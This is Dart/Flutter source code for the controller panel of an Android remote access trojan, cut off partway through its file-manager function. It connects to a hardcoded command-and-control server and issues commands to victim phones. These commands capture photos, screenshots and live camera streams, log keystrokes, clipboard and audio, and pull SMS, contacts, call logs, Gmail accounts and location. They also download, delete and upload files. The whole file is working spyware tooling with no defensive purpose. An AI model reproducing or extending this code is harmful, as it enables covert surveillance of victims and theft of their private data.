// ignore_for_file: use_build_context_synchronously
import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:video_player/video_player.dart';

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic> device;
  final String operator;
  
  const ControlCenterPage({
    super.key,
    required this.device,
    required this.operator,
  });

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false;
  
  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  String _targetUID = "";
  Map<String, dynamic> _deviceData = {};
  
  late AnimationController _pulseController;
  late AnimationController _glowController;
  late AnimationController _rotateController;
  late Animation<double> _pulseAnimation;
  late Animation<double> _glowAnimation;
  late Animation<double> _rotateAnimation;
  
  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController = TextEditingController();

  final ValueNotifier<Uint8List?> _liveFrameNotifier = ValueNotifier(null);
  final ValueNotifier<String> _keylogNotifier = ValueNotifier("");

  // Video Player
  late VideoPlayerController _videoController;
  bool _isVideoInitialized = false;

  // NEO BRUTALISM PALETTE
  static const Color _bg = Color(0xFFFFF8E7);
  static const Color _ink = Color(0xFF111111);
  static const Color _white = Color(0xFFFFFFFF);
  static const Color _yellow = Color(0xFFFFD43B);
  static const Color _red = Color(0xFFFF5C5C);
  static const Color _blue = Color(0xFF4D96FF);
  static const Color _purple = Color(0xFFA78BFA);
  static const Color _green = Color(0xFF6EEB83);
  static const Color _orange = Color(0xFFFF9F43);
  static const Color _rose = Color(0xFFFF70A6);

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );
    _pulseAnimation = Tween<double>(begin: 0.92, end: 1.08).animate(_pulseController);
    _pulseController.repeat(reverse: true);
    
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2500),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateController = AnimationController(
      duration: const Duration(seconds: 20),
      vsync: this,
    );
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
    
    _keylogNotifier.value = "";
    
    _videoController = VideoPlayerController.asset('assets/videos/bnb.mp4')
      ..initialize().then((_) {
        setState(() {
          _isVideoInitialized = true;
        });
        _videoController.setLooping(true);
        _videoController.play();
      });
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    if (!_isInit) {
      debugPrint('========================================');
      debugPrint('[CONTROL] didChangeDependencies called');
      debugPrint('[CONTROL] widget.device: ${widget.device}');
      debugPrint('[CONTROL] widget.operator: ${widget.operator}');
      debugPrint('========================================');
      
      // Use widget parameters directly (dari Navigator.pushNamed arguments)
      if (widget.device != null && widget.device.isNotEmpty) {
        _targetId = widget.device['id']?.toString() ?? "unknown";
        _targetModel = widget.device['model']?.toString() ?? "TARGET DEVICE";
        _targetUID = widget.device['uid']?.toString() ?? "";
        _deviceData = Map.from(widget.device); // Create mutable copy
        
        debugPrint('========================================');
        debugPrint('[CONTROL] Using widget.device');
        debugPrint('[CONTROL] Target ID: $_targetId');
        debugPrint('[CONTROL] Target UID: $_targetUID');
        debugPrint('[CONTROL] Target Model: $_targetModel');
        debugPrint('[CONTROL] Operator: ${widget.operator}');
        debugPrint('[CONTROL] Device Data: $_deviceData');
        debugPrint('========================================');
      } else {
        // Fallback to ModalRoute arguments (legacy support)
        final args = ModalRoute.of(context)?.settings.arguments;
        debugPrint('[CONTROL] Fallback: Checking ModalRoute arguments: $args');
        
        if (args is Map<String, dynamic>) {
          final device = args['device'] as Map<String, dynamic>?;
          if (device != null && device.isNotEmpty) {
            _targetId = device['id']?.toString() ?? "unknown";
            _targetModel = device['model']?.toString() ?? "TARGET DEVICE";
            _targetUID = device['uid']?.toString() ?? "";
            _deviceData = Map.from(device); // Create mutable copy
            
            debugPrint('========================================');
            debugPrint('[CONTROL] Using ModalRoute device');
            debugPrint('[CONTROL] Target ID: $_targetId');
            debugPrint('[CONTROL] Target UID: $_targetUID');
            debugPrint('[CONTROL] Target Model: $_targetModel');
            debugPrint('[CONTROL] Device Data: $_deviceData');
            debugPrint('========================================');
          } else {
            debugPrint('[CONTROL] ERROR: Device data null or empty in ModalRoute!');
            _deviceData = {}; // Empty map as fallback
          }
        } else {
          debugPrint('[CONTROL] ERROR: No arguments found in ModalRoute!');
          _deviceData = {}; // Empty map as fallback
        }
      }
      
      _initSocket();
      _isInit = true;
    }
  }

  Widget _buildAnimatedBackground() {
    return Stack(
      children: [
        Container(color: _bg),
        CustomPaint(
          painter: _GridPainter(),
          size: Size.infinite,
        ),
        Positioned(
          top: 40,
          left: -30,
          child: Transform.rotate(
            angle: -0.1,
            child: Container(
              width: 150,
              height: 80,
              decoration: BoxDecoration(
                color: _red,
                border: Border.all(color: _ink, width: 4),
                boxShadow: const [
                  BoxShadow(color: _ink, offset: Offset(8, 8)),
                ],
              ),
            ),
          ),
        ),
        Positioned(
          bottom: -20,
          right: -30,
          child: Transform.rotate(
            angle: 0.08,
            child: Container(
              width: 180,
              height: 90,
              decoration: BoxDecoration(
                color: _yellow,
                border: Border.all(color: _ink, width: 4),
                boxShadow: const [
                  BoxShadow(color: _ink, offset: Offset(8, 8)),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildNeoCard({required Widget child}) {
    return Container(
      decoration: BoxDecoration(
        color: _white,
        borderRadius: BorderRadius.circular(4),
        border: Border.all(color: _ink, width: 3),
        boxShadow: const [
          BoxShadow(color: _ink, offset: Offset(6, 6)),
        ],
      ),
      child: child,
    );
  }

  void _initSocket() {
    try {
      socket = IO.io(
        'http://lalalucuu.alannxd.my.id:3012',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL'})
            .enableAutoConnect()
            .setReconnectionAttempts(10)
            .setReconnectionDelay(3000)
            .setTimeout(10000)
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("C2 Link Established", LogType.success);
          socket.emit('admin_ready', {'status': 'online'});
        }
      });

      socket.onConnectError((data) {
        if (mounted) {
          setState(() => _isConnected = false);
          _addLog("Connection Error - $data", LogType.error);
        }
      });

      socket.onDisconnect((_) {
        if (mounted) {
          setState(() => _isConnected = false);
          _addLog("C2 Link Terminated", LogType.warning);
        }
      });

      // ✅ Listen untuk targets list
      socket.on('targets_list', (data) {
        debugPrint('[CONTROL] Targets list received: ${data['count']} devices');
        if (mounted && data['targets'] != null) {
          List<dynamic> targets = data['targets'];
          for (var target in targets) {
            if (target['uid'] == _targetUID || target['id'] == _targetId) {
              setState(() {
                _deviceData.addAll(target);
              });
            }
          }
        }
      });

      // ✅ Listen untuk device registered
      socket.on('device_registered', (data) {
        if (data['uid'] == _targetUID || data['deviceId'] == _targetId) {
          _addLog("Device registered: ${data['deviceId']}", LogType.success);
          if (mounted) {
            setState(() {
              _deviceData['status'] = 'Online';
              _deviceData['battery'] = data['battery'] ?? _deviceData['battery'];
            });
          }
        }
      });

      // ✅ Listen untuk heartbeat update
      socket.on('heartbeat_update', (data) {
        if (data['uid'] == _targetUID || data['deviceId'] == _targetId) {
          if (mounted) {
            setState(() {
              _deviceData['battery'] = data['battery'];
              _deviceData['status'] = data['status'] ?? 'Online';
              _deviceData['lastSeen'] = data['lastSeen'];
            });
          }
        }
      });

      // ✅ Listen untuk target status
      socket.on('target_status', (data) {
        if (data['uid'] == _targetUID || data['id'] == _targetId) {
          if (mounted) {
            setState(() {
              _deviceData['status'] = data['status'];
            });
            _addLog("Target status: ${data['status']}", 
              data['status'] == 'Online' ? LogType.success : LogType.warning);
          }
        }
      });

      socket.on('new_response', (data) {
        String responseUid = data['uid']?.toString() ?? '';
        String responseDeviceId = data['deviceId']?.toString() ?? data['id']?.toString() ?? '';
        
        if (responseUid.isNotEmpty && _targetUID.isNotEmpty && responseUid != _targetUID) {
          return;
        }
        if (responseDeviceId.isNotEmpty && responseDeviceId != _targetId) {
          return;
        }
        
        String cmd = data['cmd'] ?? 'unknown';
        dynamic responseData = data['data'];
        
        _addLog("INCOMING: $cmd", LogType.info);
        
        if (cmd == "take_photo" || cmd == "get_screen" || cmd == "take_photo_flutter") {
          String imageData = responseData['image'] ?? responseData['screenshot'] ?? '';
          if (imageData.isNotEmpty) {
            _showCapturedPhoto(imageData, cmd);
          }
        } else {
          _handleDataDisplay(cmd, responseData);
        }
        
        _updateCachedData(cmd, responseData);
      });

      // ✅ Listen untuk target_response
      socket.on('target_response', (data) {
        String responseUid = data['uid']?.toString() ?? '';
        String responseDeviceId = data['deviceId']?.toString() ?? '';
        
        if (responseUid.isNotEmpty && _targetUID.isNotEmpty && responseUid != _targetUID) {
          return;
        }
        if (responseDeviceId.isNotEmpty && responseDeviceId != _targetId) {
          return;
        }
        
        String cmd = data['cmd'] ?? 'unknown';
        dynamic responseData = data['data'];
        
        _addLog("TARGET RESPONSE: $cmd", LogType.info);
        
        if (cmd == "live_camera_frame") {
          String imageData = responseData?['image'] ?? responseData ?? '';
          if (imageData is String && imageData.contains(',')) {
            imageData = imageData.split(',').last;
          }
          if (imageData is String && imageData.isNotEmpty) {
            try {
              _liveFrameNotifier.value = base64Decode(imageData.replaceAll(RegExp(r'\s+'), ''));
            } catch (e) {
              debugPrint("=> [STREAM] Base64 Decode Error: $e");
            }
          }
        } else {
          _handleDataDisplay(cmd, responseData);
          _updateCachedData(cmd, responseData);
        }
      });

      socket.on('new_notification', (data) {
        String notifUid = data['uid']?.toString() ?? '';
        if (notifUid.isNotEmpty && _targetUID.isNotEmpty && notifUid != _targetUID) {
          return;
        }
        
        _addLog("NOTIF: [${data['title']}] ${data['body']}", LogType.notification);
        _showNotificationSnackbar(data['title'] ?? "Alert", data['body'] ?? "");
        
        if (mounted) {
          setState(() {
            if (_deviceData['sms'] == null) _deviceData['sms'] = [];
            (_deviceData['sms'] as List).insert(0, {
              'address': data['title'] ?? data['app'],
              'body': data['body'] ?? data['message'],
              'date': data['timestamp'] ?? DateTime.now().millisecondsSinceEpoch,
            });
          });
        }
      });
      
      socket.on('live_frame', (data) {
        String frameUid = data['uid']?.toString() ?? '';
        String frameDeviceId = data['id']?.toString() ?? data['deviceId']?.toString() ?? '';
        
        if (frameUid.isNotEmpty && _targetUID.isNotEmpty && frameUid != _targetUID) {
          return;
        }
        if (frameDeviceId.isNotEmpty && frameDeviceId != _targetId) {
          return;
        }
        
        String imageData = data['image'] ?? '';
        if (imageData.contains(',')) imageData = imageData.split(',').last;
        if (imageData.isNotEmpty) {
          try {
            _liveFrameNotifier.value = base64Decode(imageData.replaceAll(RegExp(r'\s+'), ''));
          } catch (e) {
            debugPrint("=> [STREAM] Base64 Decode Error: $e");
          }
        }
      });
      
      socket.on('heartbeat', (data) {
        String hbUid = data['uid']?.toString() ?? '';
        String hbDeviceId = data['deviceId']?.toString() ?? '';
        
        if (hbUid.isNotEmpty && _targetUID.isNotEmpty && hbUid != _targetUID) {
          return;
        }
        if (hbDeviceId.isNotEmpty && hbDeviceId != _targetId) {
          return;
        }
        
        if (mounted) {
          setState(() {
            _deviceData['battery'] = data['battery'];
            _deviceData['status'] = data['status'] ?? 'Online';
            _deviceData['last_seen'] = DateTime.now();
          });
        }
      });
      
      socket.on('device_info', (data) {
        if (data['uid'] == _targetUID || data['id'] == _targetId) {
          setState(() {
            _deviceData.addAll(data);
          });
        }
      });

      socket.on('keylog_data', (data) {
        String klUid = data['uid']?.toString() ?? '';
        String klDeviceId = data['deviceId']?.toString() ?? '';
        
        if (klUid.isNotEmpty && _targetUID.isNotEmpty && klUid != _targetUID) {
          return;
        }
        if (klDeviceId.isNotEmpty && klDeviceId != _targetId) {
          return;
        }
        
        String timestamp = DateTime.now().toString().substring(11, 19);
        _keylogNotifier.value += "[$timestamp] ${data['keys']}\n";
        _addLog("KEYLOG: ${data['keys']}", LogType.info);
      });
      
      socket.on('clipboard_data', (data) {
        String cbUid = data['uid']?.toString() ?? '';
        String cbDeviceId = data['deviceId']?.toString() ?? '';
        
        if (cbUid.isNotEmpty && _targetUID.isNotEmpty && cbUid != _targetUID) {
          return;
        }
        if (cbDeviceId.isNotEmpty && cbDeviceId != _targetId) {
          return;
        }
        
        _addLog("CLIPBOARD: ${data['content']}", LogType.info);
      });

      socket.on('audio_chunk', (data) {
        String audioUid = data['uid']?.toString() ?? '';
        String audioDeviceId = data['deviceId']?.toString() ?? '';
        
        if (audioUid.isNotEmpty && _targetUID.isNotEmpty && audioUid != _targetUID) {
          return;
        }
        if (audioDeviceId.isNotEmpty && audioDeviceId != _targetId) {
          return;
        }
        
        _addLog("AUDIO CHUNK: ${data['data']?.length ?? 0} bytes", LogType.info);
      });

      socket.connect();
    } catch (e) {
      _addLog("Socket Init Failed - $e", LogType.error);
    }
  }

  void _updateCachedData(String cmd, dynamic data) {
    if (!mounted || data == null) return;
    setState(() {
      dynamic payload = data;
      if (data is Map && data.containsKey('data')) payload = data['data'];

      switch (cmd) {
        case "get_contacts": _deviceData['contacts'] = payload is List ? payload : (payload['contacts'] ?? []); break;
        case "get_sms": _deviceData['sms'] = payload is List ? payload : (payload['sms'] ?? []); break;
        case "get_apps": _deviceData['apps'] = payload is List ? payload : (payload['apps'] ?? []); break;
        case "get_gmails": _deviceData['accounts'] = payload is List ? payload : (payload['accounts'] ?? []); break;
        case "get_location": _deviceData['location'] = payload; break;
        case "list_files": 
          if (payload['files'] != null) _deviceData['files'] = payload['files'];
          break;
        case "get_call_logs":
          if (payload['calls'] != null) _deviceData['calls'] = payload['calls'];
          break;
      }
    });
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _glowController.dispose();
    _rotateController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _liveFrameNotifier.dispose();
    _keylogNotifier.dispose();
    _videoController.dispose();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 100) _executionLogs.removeLast();
      });
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (_logScrollController.hasClients) {
          _logScrollController.animateTo(0, duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
        }
      });
    }
  }

  void _showNotificationSnackbar(String title, String body) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(Icons.notifications_active, color: _ink, size: 18),
            const SizedBox(width: 10),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text(title, style: const TextStyle(fontWeight: FontWeight.w900, fontSize: 11)),
                  Text(body, style: const TextStyle(fontSize: 10)),
                ],
              ),
            ),
          ],
        ),
        backgroundColor: _yellow,
        duration: const Duration(seconds: 5),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(4),
          side: const BorderSide(color: _ink, width: 2),
        ),
      ),
    );
  }

  void _showCapturedPhoto(String base64Image, String title) {
    Uint8List bytes = Uint8List(0);
    try {
      bytes = base64Decode(base64Image.replaceAll(RegExp(r'\s+'), ''));
    } catch (e) {
      _addLog("Invalid image data", LogType.error);
      return;
    }
    
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          decoration: BoxDecoration(
            color: _white,
            borderRadius: BorderRadius.circular(4),
            border: Border.all(color: _ink, width: 4),
            boxShadow: const [
              BoxShadow(color: _ink, offset: Offset(8, 8)),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(16),
                decoration: const BoxDecoration(
                  color: _yellow,
                ),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _white,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Icon(Icons.camera_alt, color: _ink, size: 16),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      title.toUpperCase(),
                      style: const TextStyle(
                        color: _ink,
                        fontWeight: FontWeight.w900,
                        fontSize: 13,
                        letterSpacing: 2,
                      ),
                    ),
                    const Spacer(),
                    Text(
                      _formatTime(DateTime.now()),
                      style: TextStyle(color: _ink.withOpacity(0.5), fontSize: 9),
                    ),
                  ],
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(16),
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(4),
                  child: InteractiveViewer(
                    minScale: 0.5,
                    maxScale: 4.0,
                    child: Image.memory(
                      bytes,
                      fit: BoxFit.contain,
                      errorBuilder: (context, error, stackTrace) => Container(
                        padding: const EdgeInsets.all(40),
                        color: _red,
                        child: Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            const Icon(Icons.broken_image, color: _ink, size: 48),
                            const SizedBox(height: 8),
                            Text("Invalid Stream Data", style: TextStyle(color: _ink)),
                          ],
                        ),
                      ),
                    ),
                  ),
                ),
              ),
              Padding(
                padding: const EdgeInsets.only(bottom: 16, left: 16, right: 16),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () {
                        Clipboard.setData(ClipboardData(text: base64Image));
                        _addLog("Image data copied to clipboard", LogType.success);
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: _blue,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Row(
                          children: [
                            Icon(Icons.copy, size: 14, color: _ink),
                            SizedBox(width: 4),
                            Text("COPY", style: TextStyle(fontSize: 11, fontWeight: FontWeight.w900, color: _ink)),
                          ],
                        ),
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                        decoration: BoxDecoration(
                          color: _red,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text(
                          "CLOSE",
                          style: TextStyle(fontSize: 11, fontWeight: FontWeight.w900, letterSpacing: 2, color: _ink),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showLiveCameraDialog() {
    _liveFrameNotifier.value = null;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          decoration: BoxDecoration(
            color: _white,
            borderRadius: BorderRadius.circular(4),
            border: Border.all(color: _ink, width: 4),
            boxShadow: const [
              BoxShadow(color: _ink, offset: Offset(8, 8)),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(16),
                decoration: const BoxDecoration(
                  color: _green,
                ),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _white,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Icon(Icons.videocam, color: _ink, size: 16),
                    ),
                    const SizedBox(width: 12),
                    const Text(
                      "LIVE CAMERA",
                      style: TextStyle(
                        color: _ink,
                        fontWeight: FontWeight.w900,
                        fontSize: 13,
                        letterSpacing: 2,
                      ),
                    ),
                    const Spacer(),
                    const SizedBox(
                      width: 14,
                      height: 14,
                      child: CircularProgressIndicator(strokeWidth: 2, color: _ink),
                    ),
                  ],
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(12),
                child: ValueListenableBuilder<Uint8List?>(
                  valueListenable: _liveFrameNotifier,
                  builder: (context, bytes, child) {
                    if (bytes == null) {
                      return Container(
                        height: 250,
                        width: double.infinity,
                        decoration: BoxDecoration(
                          color: _bg,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(FontAwesomeIcons.wifi as IconData, color: _ink, size: 40),
                            const SizedBox(height: 10),
                            Text("Connecting to target stream...", style: TextStyle(color: _ink.withOpacity(0.5), fontSize: 11)),
                          ],
                        ),
                      );
                    }
                    return ClipRRect(
                      borderRadius: BorderRadius.circular(4),
                      child: Image.memory(bytes, fit: BoxFit.contain, gaplessPlayback: true),
                    );
                  },
                ),
              ),
              Padding(
                padding: const EdgeInsets.only(bottom: 16, right: 16),
                child: Align(
                  alignment: Alignment.centerRight,
                  child: GestureDetector(
                    onTap: () {
                      _sendCommand("stop_live_camera", _targetId);
                      Navigator.pop(context);
                      _addLog("Live stream terminated by Admin.", LogType.warning);
                    },
                    child: Container(
                      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                      decoration: BoxDecoration(
                        color: _red,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Text(
                        "STOP STREAM",
                        style: TextStyle(fontSize: 11, fontWeight: FontWeight.w900, letterSpacing: 2, color: _ink),
                      ),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _handleDataDisplay(String cmd, dynamic data) {
    if (data == null) return;
    switch (cmd) {
      case "get_location": _addLog("GPS: Lat ${data['lat']}, Lng ${data['lng']}", LogType.location); break;
      case "get_gmails": _addLog("GMAIL: ${(data is List ? data : (data['accounts'] ?? [])).length} account(s) found", LogType.info); break;
      case "get_contacts": _addLog("CONTACTS: ${(data is List ? data : (data['contacts'] ?? [])).length} contact(s) retrieved", LogType.info); break;
      case "get_sms": _addLog("SMS: ${(data is List ? data : (data['sms'] ?? [])).length} message(s) retrieved", LogType.info); break;
      case "get_apps": _addLog("APPS: ${(data is List ? data : (data['apps'] ?? [])).length} application(s) found", LogType.info); break;
      case "get_clipboard": _addLog("CLIPBOARD: ${data['clipboard'] ?? 'Empty'}", LogType.info); break;
      default: _addLog("DATA: $cmd - ${data.toString().length > 50 ? data.toString().substring(0, 50) : data.toString()}...", LogType.debug);
    }
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra}) async {
    if (!_isConnected) {
      _addLog("No C2 connection", LogType.warning);
      return;
    }
    
    setState(() => _isProcessing = true);
    
    try {
      final Map<String, dynamic> payload = {
        "deviceId": targetId,
        "uid": _targetUID,
        "command": command,
        "extra": extra ?? "",
        "timestamp": DateTime.now().millisecondsSinceEpoch
      };

      debugPrint('[CONTROL] Sending command: $command to UID: $_targetUID');

      // Kirim via Socket.IO
      socket.emit('send_command', {
        'deviceId': targetId,
        'uid': _targetUID,
        'cmd': command,
        'extra': extra ?? '',
        'timestamp': DateTime.now().millisecondsSinceEpoch
      });

      // Kirim via HTTP (fallback)
      final response = await http.post(
        Uri.parse("http://lalalucuu.alannxd.my.id:3012/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode(payload),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        String logMsg = "SENT: $command";
        if (extra != null && extra.isNotEmpty) {
          logMsg += " (Args: $extra)";
        }
        _addLog(logMsg, LogType.success);
      } else {
        _addLog("ERR: Server returned ${response.statusCode} for $command", LogType.error);
      }
    } catch (e) {
      String errStr = e.toString();
      _addLog("ERR: ${errStr.substring(0, errStr.length > 45 ? 45 : errStr.length)}...", LogType.error);
    } finally {
      if (mounted) setState(() => _isProcessing = false);
    }
  }

  String _formatTime(DateTime time) => "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return _green;
      case LogType.error: return _red;
      case LogType.warning: return _orange;
      case LogType.notification: return _blue;
      case LogType.location: return _purple;
      default: return _ink.withOpacity(0.7);
    }
  }

  int _parseBattery(dynamic b) {
    if (b is int) return b;
    if (b is double) return b.toInt();
    if (b is String) return int.tryParse(b) ?? 0;
    return 0;
  }

  Color _getBatteryColor(int level) {
    if (level >= 50) return _green;
    if (level >= 20) return _orange;
    return _red;
  }

  // ==================== RAT ADVANCED FEATURES ====================

  void _openFileManager() {
    _sendCommand("list_files", _targetId, extra: "/storage/emulated/0");
    
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setStateDialog) {
          String currentPath = "/storage/emulated/0";
          List<Map<String, dynamic>> files = [];
          bool loading = true;
          
          _fetchFiles(currentPath, setStateDialog, files, loading);
          
          return Dialog(
            backgroundColor: Colors.transparent,
            child: _buildNeoCard(
              child: Container(
                width: MediaQuery.of(context).size.width * 0.85,
                height: MediaQuery.of(context).size.height * 0.7,
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _blue,
                            borderRadius: BorderRadius.circular(4),
                            border: Border.all(color: _ink, width: 2),
                          ),
                          child: Icon(Icons.folder, color: _ink, size: 18),
                        ),
                        const SizedBox(width: 8),
                        const Text(
                          "FILE MANAGER",
                          style: TextStyle(
                            color: _ink,
                            fontSize: 14,
                            fontWeight: FontWeight.w900,
                            letterSpacing: 2,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 12),
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _yellow,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: Row(
                        children: [
                          const Icon(Icons.folder_open, color: _ink, size: 14),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              currentPath,
                              style: const TextStyle(color: _ink, fontSize: 10),
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 12),
                    Expanded(
                      child: loading
                          ? const Center(child: CircularProgressIndicator(color: _ink))
                          : ListView.builder(
                              itemCount: files.length,
                              itemBuilder: (ctx, idx) {
                                var file = files[idx];
                                bool isDir = file['isDirectory'] ?? false;
                                return Container(
                                  margin: const EdgeInsets.only(bottom: 4),
                                  child: _buildNeoCard(
                                    child: ListTile(
                                      leading: Icon(
                                        isDir ? Icons.folder : Icons.insert_drive_file,
                                        color: isDir ? _blue : _ink.withOpacity(0.5),
                                        size: 18,
                                      ),
                                      title: Text(
                                        file['name'],
                                        style: const TextStyle(color: _ink, fontSize: 11),
                                      ),
                                      subtitle: !isDir
                                          ? Text(
                                              _formatFileSize(file['size'] ?? 0),
                                              style: TextStyle(color: _ink.withOpacity(0.4), fontSize: 9),
                                            )
                                          : null,
                                      trailing: !isDir
                                          ? Row(
                                              mainAxisSize: MainAxisSize.min,
                                              children: [
                                                GestureDetector(
                                                  onTap: () => _downloadFile(file['path']),
                                                  child: Container(
                                                    padding: const EdgeInsets.all(8),
                                                    decoration: BoxDecoration(
                                                      color: _green,
                                                      borderRadius: BorderRadius.circular(4),
                                                      border: Border.all(color: _ink, width: 2),
                                                    ),
                                                    child: const Icon(Icons.download, color: _ink, size: 16),
                                                  ),
                                                ),
                                                const SizedBox(width: 8),
                                                GestureDetector(
                                                  onTap: () => _deleteFile(file['path']),
                                                  child: Container(
                                                    padding: const EdgeInsets.all(8),
                                                    decoration: BoxDecoration(
                                                      color: _red,
                                                      borderRadius: BorderRadius.circular(4),
                                                      border: Border.all(color: _ink, width: 2),
                                                    ),
                                                    child: const Icon(Icons.delete, color: _ink, size: 16),
                                                  ),
                                                ),
                                              ],
                                            )
                                          : null,
                                      onTap: () {
                                        if (isDir) {
                                          currentPath = file['path'];
                                          _fetchFiles(currentPath, setStateDialog, files, loading);
                                        }
                                      },
                                    ),
                                  ),
                                );
                              },
                            ),
                    ),
                    const SizedBox(height: 12),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        GestureDetector(
                          onTap: () => Navigator.pop(context),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            decoration: BoxDecoration(
                              color: _bg,
                              borderRadius: BorderRadius.circular(4),
                              border: Border.all(color: _ink, width: 2),
                            ),
                            child: const Text("CLOSE", style: TextStyle(color: _ink, fontSize: 11, fontWeight: FontWeight.w900)),
                          ),
                        ),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: () => _uploadFile(),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            decoration: BoxDecoration(
                              color: _yellow,
                              borderRadius: BorderRadius.circular(4),
                              border: Border.all(color: _ink, width: 2),
                            ),
                            child: const Row(
                              children: [
                                Icon(Icons.upload, size: 14, color: _ink),
                                SizedBox(width: 6),
                                Text("UPLOAD", style: TextStyle(fontSize: 11, fontWeight: FontWeight.w900, color: _ink)),
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          );
        },
      ),
    );
  }

  void _fetchFiles(String path, StateSetter setStateDialog, List<Map<String, dynamic>> files, bool loading) async {
    setStateDialog(() { loading = true; });
    try {
      await _sendCommand("list_files", _targetId, extra: path);
